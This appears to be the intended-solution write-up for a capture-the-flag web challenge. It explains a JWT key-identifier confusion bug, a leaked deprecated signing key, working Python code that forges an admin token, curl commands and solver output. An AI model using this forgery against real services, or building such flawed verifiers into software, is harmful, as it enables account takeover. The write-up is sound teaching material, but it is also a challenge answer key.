# Signal Vault — intended solution

**Vulnerability:** JWT key-identifier confusion. The verifier resolves the HMAC
key from the client-controlled `kid` header against a key inventory that still
contains a deprecated development key, and that key is disclosed by a forgotten
diagnostics endpoint.

The relevant code in `app.py`:

```python
kid = header.get("kid")
if not isinstance(kid, str) or kid not in SIGNING_KEYS:
    return None

key = SIGNING_KEYS[kid]      # <-- the bug: any key in the inventory is trusted
```

The signature verification below this line is correct — constant-time HMAC-SHA256
over the exact signing input, with `alg` pinned to `HS256`. So the two reflexive
attacks both fail, and the player has to actually recover key material.

---

## Step-by-step walkthrough

### 1. Log in as the published analyst

`guest` / `guest` from the landing page. You land on `/console` and get an
`HttpOnly` cookie named `sv_session`.

### 2. Read your own token

The console prints your decoded claims, and the page text states that the
signing key is chosen by the `kid` header. Decode the cookie's first segment:

```json
{"alg": "HS256", "kid": "main-2026", "typ": "JWT"}
```
```json
{"clearance": "OPEN", "display": "Guest Analyst", "exp": 1770000000,
 "iat": 1769996400, "role": "analyst", "sub": "guest"}
```

`role` is the gate. `/vault` returns 403 with `role: analyst`.

### 3. Rule out the easy forgeries

- `alg: none` with an empty signature → rejected (`alg` must be `HS256`).
- Signature stripped or replaced → rejected (HMAC comparison).
- A guessed `kid` such as `main-2027` → rejected (unknown key id).

You need the real key bytes for a `kid` the server trusts.

### 4. Find the leaked key inventory

`robots.txt` disallows `/internal/`. The `/console` HTML carries a developer
comment naming the exact route:

```html
<!-- TODO(r.mendoza): ... still wired up at /internal/support-bundle ...
     it prints the whole key inventory. -->
```

`GET /internal/support-bundle` (any authenticated session will do) returns
base64-encoded JSON:

```bash
curl -s -b "sv_session=$TOKEN" http://HOST:8080/internal/support-bundle \
  | python3 -c "import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)['bundle']).decode())"
```

```json
{
  "key_inventory": [
    {"kid": "main-2026",  "status": "active",     "material": "<withheld by export policy>"},
    {"kid": "legacy-dev", "status": "deprecated", "material": "svc-dev-rotate-me",
     "note": "Kept for the 2024 ingest workers. Verifier still trusts it."}
  ],
  "open_tickets": ["SV-882  Finish key rotation: verifier resolves whatever kid the client sends ..."]
}
```

The active key is withheld — and is random per container boot, so there is
nothing to crack. The deprecated key is printed in full, and ticket SV-882
confirms the verifier still honours it.

### 5. Forge an admin token

Sign a payload with `kid: legacy-dev`, the leaked key, and `role: admin`:

```python
import base64, hashlib, hmac, json, time

b64 = lambda raw: base64.urlsafe_b64encode(raw).decode().rstrip("=")
dump = lambda obj: json.dumps(obj, separators=(",", ":"), sort_keys=True).encode()

now = int(time.time())
header = {"alg": "HS256", "typ": "JWT", "kid": "legacy-dev"}
claims = {"sub": "guest", "role": "admin", "clearance": "VAULT",
          "display": "Guest Analyst", "iat": now, "exp": now + 3600}

signing_input = f"{b64(dump(header))}.{b64(dump(claims))}"
sig = hmac.new(b"svc-dev-rotate-me", signing_input.encode(), hashlib.sha256).digest()
print(f"{signing_input}.{b64(sig)}")
```

### 6. Collect the flag

Replace the `sv_session` cookie with the forged token and request `/vault`.

```bash
curl -s -b "sv_session=$FORGED" http://HOST:8080/vault | grep -o 'CTF{[^}]*}'
```

A `role` claim of `admin` passes `admin_required`, and the vault renders the
flag.

---

## Automated solver

`solve.py` performs the whole chain with the standard library only:

```
$ python3 solve.py http://127.0.0.1:8080
[*] target http://127.0.0.1:8080
[+] logged in as guest
[+] token header  {'alg': 'HS256', 'kid': 'main-2026', 'typ': 'JWT'}
[+] token claims  role=analyst clearance=OPEN
[+] /vault as analyst -> HTTP 403 (expected 403)
[+] key inventory recovered:
      kid=main-2026    material=<withheld by export policy>
      kid=legacy-dev   material=svc-dev-rotate-me
[+] usable signing key: kid='legacy-dev' key='svc-dev-rotate-me'
[+] forged token: eyJhbGciOiJIUzI1NiIsImtpZCI6ImxlZ2FjeS1kZXYiLCJ0...
[+] /vault as forged admin -> HTTP 200

    FLAG: CTF{...your flag here...}
```

---

## The lesson to put on the debrief slide

Rotating a signing key means *removing the old one from the verifier*, not
keeping it "just for the legacy workers". A key inventory indexed by an
attacker-controlled header is only as strong as its weakest entry — and
diagnostics endpoints are where key material goes to leak.
